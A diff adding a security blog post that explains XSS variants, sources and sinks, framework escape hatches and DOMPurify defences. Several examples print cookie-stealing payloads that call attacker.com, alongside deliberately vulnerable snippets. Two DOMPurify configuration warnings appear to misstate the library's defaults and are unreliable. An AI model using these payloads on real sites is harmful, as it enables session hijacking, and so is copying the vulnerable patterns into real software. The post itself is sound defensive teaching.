@@ -1,0 +1,358 @@
+---
+title: "XSS Anatomy: Every Variant, Every Vector"
+date: "Apr 2026"
+pubDate: 2026-04-14
+category: Security
+author: Honey Sharma
+summary: XSS is not one attack — it's four. This post dissects every variant, maps every sink and source, and shows exactly which React patterns undo framework-level protection.
+tags: [security, xss, dom, react, dompurify, frontend]
+---
+import SequenceDiagram from '../../../components/mdx/SequenceDiagram.astro';
+import Comparison from '../../../components/mdx/Comparison.astro';
+import Callout from '../../../components/mdx/Callout.astro';
+import Lessons from '../../../components/mdx/Lessons.astro';
+import Lesson from '../../../components/mdx/Lesson.astro';
+
+A DevForum user posts what looks like a syntax-highlighted code block. It contains a hidden `<script>` tag. The moment any other logged-in user loads the article, the script fires silently. It reads `document.cookie`, packages the session token, and fires it to a server the attacker controls. No alert box. No visible sign anything went wrong. Within an hour, forty sessions are hijacked from a single comment.
+
+The developer who built the comment renderer used React. They assumed React protected them. It mostly does — unless you use `dangerouslySetInnerHTML`. They used it once, eighteen months ago, to support a markdown renderer that needed to inject styled blockquotes. It was never revisited.
+
+That's XSS. Not a theoretical vulnerability — a routine consequence of trusting user content in the wrong place.
+
+---
+
+## The Browser's Trust Model
+
+Before looking at how XSS happens, you need to understand *why* it's so damaging.
+
+JavaScript that runs inside a page has full access to everything on that page's origin. `document.cookie`. `localStorage`. `sessionStorage`. Every DOM node. Every form's contents. The ability to make authenticated `fetch()` calls to the same origin.
+
+The browser cannot distinguish your JavaScript from injected JavaScript. They run under the same origin, with the same permissions. There's no flag on a DOM node that says "this script was trusted by the developer." If a script executes on `devforum.com`, it has `devforum.com`'s full authority.
+
+That's what XSS exploits: the browser's complete trust in anything that runs inside the page.
+
+---
+
+## Reflected XSS
+
+DevForum has a search feature. The server takes the `q` parameter and renders results:
+
+```js
+// Express route — do not ship this
+app.get('/search', (req, res) => {
+  res.send(`
+    <h1>Results for: ${req.query.q}</h1>
+    ${renderResults(req.query.q)}
+  `);
+});
+```
+
+The parameter goes directly into the HTML with no escaping. An attacker constructs a URL:
+
+```
+https://devforum.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+```
+
+They send this link to a DevForum user via a DM. The victim clicks it. Here's what happens:
+
+<SequenceDiagram
+  title="Reflected XSS Attack Chain"
+  actors={[
+    { id: "attacker", label: "Attacker", variant: "malicious" },
+    { id: "victim",   label: "Victim's Browser", icon: "browser" },
+    { id: "forum",    label: "devforum.com", icon: "server", variant: "trusted" },
+    { id: "c2",       label: "attacker.com", icon: "server", variant: "malicious" }
+  ]}
+  messages={[
+    { from: "attacker", to: "victim",   label: "Sends link via DM", sublabel: "/search?q=<script>fetch(...document.cookie)</script>", type: "attack" },
+    { from: "victim",   to: "forum",    label: "GET /search?q=<script>...", type: "attack", highlight: true },
+    { from: "forum",    to: "victim",   label: "200 OK — payload rendered inline", sublabel: "<h1>Results for: <script>fetch(...)</script></h1>", type: "response" },
+    { from: "victim",   to: "c2",       label: "GET /steal?c=session=abc123", type: "attack", annotation: "script executes" }
+  ]}
+  caption="The payload travels in the URL and lands verbatim in the server's HTML response. The victim's browser executes it with full origin access."
+/>
+
+The fix is one line: HTML-encode the parameter before rendering it. `req.query.q` becomes `he.encode(req.query.q)`, or you switch to a templating engine that escapes by default. The script tag becomes the literal text `&lt;script&gt;` — visible, harmless.
+
+**Why it's called "reflected":** the payload is sent to the server and reflected straight back in the response. The server is a mirror, not a target.
+
+---
+
+## Stored XSS
+
+Reflected XSS requires the victim to click a crafted link. Stored XSS is more dangerous: the attacker injects the payload once, and it fires for every user who loads the page — no link required.
+
+On DevForum, comments are stored in the database and rendered for every visitor. An attacker posts this comment:
+
+```html
+Great article! Really helpful.
+<script>
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({ cookie: document.cookie, url: location.href })
+  });
+</script>
+```
+
+The server stores this string in MongoDB. The server renders it into every response for that article. Every logged-in user who visits the article becomes a victim.
+
+<SequenceDiagram
+  title="Stored XSS Attack Chain"
+  actors={[
+    { id: "attacker", label: "Attacker", variant: "malicious" },
+    { id: "forum",    label: "devforum.com", icon: "server", variant: "trusted" },
+    { id: "victim",   label: "Any Visitor", icon: "browser" },
+    { id: "c2",       label: "attacker.com", icon: "server", variant: "malicious" }
+  ]}
+  messages={[
+    { from: "attacker", to: "forum",  label: "POST /comments — payload in body", type: "attack" },
+    { from: "forum",    to: "forum",  label: "Stored in database", type: "note" },
+    { from: "victim",   to: "forum",  label: "GET /articles/123 (any future visit)", type: "request" },
+    { from: "forum",    to: "victim", label: "200 OK — payload embedded in HTML", type: "response", highlight: true },
+    { from: "victim",   to: "c2",     label: "Exfiltrate session token", type: "attack", annotation: "fires for every visitor" }
+  ]}
+  caption="Written once. Fires for every user who loads the page — no malicious link, no victim action beyond a normal visit."
+/>
+
+This is the attack that hit DevForum at the start of this post. One comment. Forty sessions in an hour. The payload keeps firing until someone notices and deletes it.
+
+---
+
+## DOM-Based XSS
+
+The two variants above both involve the server rendering the payload. DOM-based XSS lives entirely in the client — the server never sees the malicious input.
+
+DevForum has a "highlight by username" feature: open an article with `?highlight=honeysharma` in the URL and any mention of that username is visually highlighted. The implementation:
+
+```js
+// client.js — runs in the browser
+const params = new URLSearchParams(location.search);
+const user = params.get('highlight');
+
+if (user) {
+  document.getElementById('highlight-target').innerHTML =
+    `Highlighting mentions of <strong>${user}</strong>`;
+}
+```
+
+The `highlight` parameter goes straight into `innerHTML`. An attacker crafts a link:
+
+```
+https://devforum.com/articles/123?highlight=<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
+```
+
+The server sees a completely normal request for article 123. Its response contains no payload. The payload is in the URL. The browser reads it, the client-side JS writes it to the DOM, and it executes.
+
+**Why this matters for detection:** WAFs, server-side sanitisers, and security scanners that inspect HTTP responses will find nothing. The vulnerability exists entirely in the client.
+
+<Callout type="warning" title="DOM XSS cannot be fixed server-side">
+  Any input that flows from `location.search`, `location.hash`, `document.referrer`, or `postMessage` into a DOM sink (`innerHTML`, `outerHTML`, `document.write`, `eval`) is a DOM XSS vector. Sanitise it on the client, at the point of insertion.
+</Callout>
+
+---
+
+## Mutation XSS (mXSS)
+
+Mutation XSS exploits a gap between what a sanitiser considers safe and what the browser's HTML parser actually produces.
+
+The browser's parser is not a validator — it's a recovery machine. It will fix malformed markup, restructure elements to match the content model, and produce valid HTML from invalid input. This restructuring can turn a "safe" sanitised string into one that contains executable script.
+
+A classic example:
+
+```html
+<!-- Input that passes a naive sanitiser (SVG tags allowed, no scripts) -->
+<svg><p><style><img src=x onerror=alert(1)>
+
+<!-- What the browser's parser produces -->
+<svg>
+  <p></p>
+  <style>
+    <!-- img tag is moved out of style context -->
+  </style>
+</svg>
+<img src="x" onerror="alert(1)">
+```
+
+The sanitiser saw a `<style>` block with what looked like text. The browser's parser saw invalid nesting inside SVG and restructured — moving the `<img>` to a position where its `onerror` handler could fire.
+
+<Callout type="warning" title="Why naive allowlists fail against mXSS">
+  Sanitising before browser parsing means the sanitiser and the parser see different DOM trees. DOMPurify addresses this by running the parser internally and sanitising the *parsed result* — not the raw string. Never write your own HTML allowlist.
+</Callout>
+
+---
+
+## Sources and Sinks
+
+Every XSS attack connects a **source** (where attacker input enters the application) to a **sink** (where that input is interpreted as code or markup).
+
+<Comparison
+  headers={["Category", "Examples", "Risk", "Notes"]}
+  rows={[
+    ["Sink — DOM write",     "innerHTML, outerHTML, document.write()",           "Critical", "Most common XSS landing point"],
+    ["Sink — code exec",     "eval(), setTimeout(string), setInterval(string)",   "Critical", "Executes string as JavaScript directly"],
+    ["Sink — attribute",     "el.src = x, el.href = x, el.srcdoc = x",           "High",     "javascript: scheme injection via attributes"],
+    ["Source — URL",         "location.search, location.hash, document.referrer", "High",     "Most DOM XSS enters here"],
+    ["Source — cross-frame", "window.addEventListener('message', e => e.data)",  "Medium",   "postMessage without origin check"],
+    ["Source — API",         "res.data.commentBody, res.data.username",           "High",     "Stored XSS path — data from DB"],
+    ["Source — persistence", "localStorage.getItem(), window.name",               "Medium",   "Survives navigation; often overlooked"],
+  ]}
+  caption="An XSS vulnerability exists at every path that connects a source to a sink without sanitisation."
+/>
+
+In code review, the exercise is: trace every source. Follow it through the callstack. Does it reach a sink? If yes, is it sanitised before it gets there?
+
+---
+
+## SVG and Markdown Vectors
+
+Two vectors that bypass filters that only check HTML tags:
+
+**SVG script injection.** SVG is valid HTML5 and the `<svg>` element creates a different namespace context. A sanitiser that blocks `<script>` at the HTML level may not check inside SVG:
+
+```html
+<svg>
+  <script>alert(document.cookie)</script>
+</svg>
+```
+
+This executes in Chrome, Firefox, and Safari. A filter that only pattern-matches `<script>` on the outer HTML will miss it.
+
+**Markdown `javascript:` links.** Markdown renderers that convert `[text](url)` to `<a href="url">text</a>` without checking the URL scheme:
+
+```markdown
+[Click here for the results](javascript:fetch('https://attacker.com/steal?c='+document.cookie))
+```
+
+This passes sanitisers that only look for HTML tags. The link renders cleanly. When the victim clicks it, the JS executes under the page's origin.
+
+<Callout type="warning" title="Markdown renderers output HTML sinks">
+  If your markdown renderer produces HTML, its output is a sink. Apply DOMPurify to the rendered HTML output — not to the markdown source. Also explicitly check that your renderer does not allow `javascript:` scheme in href attributes.
+</Callout>
+
+---
+
+## React, Vue, Angular: The Escape Hatches
+
+React, Vue, and Angular protect you by default. When you render user content through the normal template path, the framework converts it to a text node — not markup:
+
+```jsx
+// Safe — React renders this as a text node, not HTML
+function Comment({ body }) {
+  return <div className="comment">{body}</div>;
+}
+```
+
+If `body` is `<script>alert(1)</script>`, React renders it as the literal characters `&lt;script&gt;alert(1)&lt;/script&gt;` — visible, not executable.
+
+The problem is the escape hatch:
+
+```jsx
+// Vulnerable — raw HTML injected into the DOM
+function Comment({ body }) {
+  return <div dangerouslySetInnerHTML={{ __html: body }} />;
+}
+
+// Fixed — sanitise before injecting
+import DOMPurify from 'dompurify';
+
+function Comment({ body }) {
+  return (
+    <div
+      dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(body) }}
+    />
+  );
+}
+```
+
+The same pattern in Vue (`v-html`) and Angular (`bypassSecurityTrustHtml`):
+
+```html
+<!-- Vue — vulnerable -->
+<div v-html="comment.body"></div>
+
+<!-- Vue — fixed -->
+<div v-html="sanitize(comment.body)"></div>
+```
+
+```ts
+// Angular — vulnerable
+this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(comment.body);
+
+// Angular — fixed: don't use bypassSecurityTrustHtml with user content
+// Let Angular's built-in sanitiser handle it, or pre-sanitise with DOMPurify
+```
+
+<Callout type="danger" title="The name is not a joke">
+  `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml` — these APIs are named as warnings. Every occurrence in a codebase should be treated as a security checkpoint in code review. Ask: where does this HTML come from, and is it sanitised before it arrives here?
+</Callout>
+
+---
+
+## DOMPurify in Practice
+
+DOMPurify is the standard client-side sanitiser. It works by parsing the input using the browser's own HTML parser, walking the resulting DOM, and removing anything that doesn't pass its allowlist — then serialising the safe DOM back to a string.
+
+```js
+import DOMPurify from 'dompurify';
+
+// Basic usage — safe defaults
+const clean = DOMPurify.sanitize(dirty);
+
+// Allow specific tags beyond the defaults
+const clean = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
+  ALLOWED_ATTR: ['href'],
+});
+```
+
+Two configuration mistakes that open XSS vectors:
+
+```js
+// Dangerous — ALLOW_DATA_ATTR re-enables data-* attributes
+// Some parsers and frameworks execute handlers attached to data-* attributes
+DOMPurify.sanitize(dirty, { ALLOW_DATA_ATTR: true });
+
+// Dangerous — FORCE_BODY: false changes the parsing context
+// Body context parses differently from fragment context;
+// some mXSS payloads survive only outside a body element
+DOMPurify.sanitize(dirty, { FORCE_BODY: false });
+```
+
+<Callout type="warning" title="Pin DOMPurify and monitor its changelog">
+  DOMPurify has had mXSS bypass vulnerabilities. They are discovered, disclosed responsibly, and patched — usually within days. But if you're on an old pinned version and haven't updated in a year, you may be running a version with a known bypass. Pin to a specific version in `package.json`, and treat DOMPurify updates as security patches.
+</Callout>
+
+---
+
+## XSS Variant Comparison
+
+<Comparison
+  headers={["Variant", "Source", "Server round-trip?", "Persistence", "Severity"]}
+  rows={[
+    ["Reflected",      "URL parameter",         "Yes — payload in response",   "None — per request",      "High"],
+    ["Stored",         "Database (user content)","Yes — payload in response",   "Permanent until deleted", "Critical"],
+    ["DOM-based",      "URL / postMessage",      "No",                          "None",                    "High"],
+    ["Mutation (mXSS)","Any sanitised input",    "Varies",                      "Varies",                  "Critical"],
+  ]}
+  caption="All four variants result in attacker-controlled JavaScript executing under your origin's trust. The entry path and persistence differ — the damage does not."
+/>
+
+---
+
+<Lessons title="XSS Defence Checklist" type="recommendations">
+  <Lesson title="Treat dangerouslySetInnerHTML as a code review checkpoint">
+    Every occurrence warrants a question: where does this HTML come from, and is it passing through DOMPurify before it arrives? If the answer to either is "I'm not sure", treat it as a vulnerability.
+  </Lesson>
+  <Lesson title="Audit every location.search and location.hash consumer">
+    Search the codebase for `location.search`, `location.hash`, `URLSearchParams`, and `document.referrer`. For each one, trace the value to where it lands. If it reaches innerHTML or any DOM sink without sanitisation, you have DOM XSS.
+  </Lesson>
+  <Lesson title="Sanitise markdown renderer output, not markdown input">
+    The vulnerability is in the HTML the renderer produces — not in the markdown source. Run DOMPurify on the rendered HTML. Also verify that your renderer does not produce `<a href="javascript:...">` links.
+  </Lesson>
+  <Lesson title="Use DOMPurify; never write your own allowlist">
+    Regex-based sanitisers fail against SVG namespacing, mXSS mutations, and `javascript:` scheme injection. DOMPurify uses the parser itself. Pin its version and subscribe to its release notes.
+  </Lesson>
+  <Lesson title="CSP is your second line of defence, not your first">
+    XSS prevention (sanitisation, framework escaping) is the first line. CSP — the subject of the next post — is the second. If a payload slips through the first line, CSP blocks its execution. Both lines are required.
+  </Lesson>
+</Lessons>
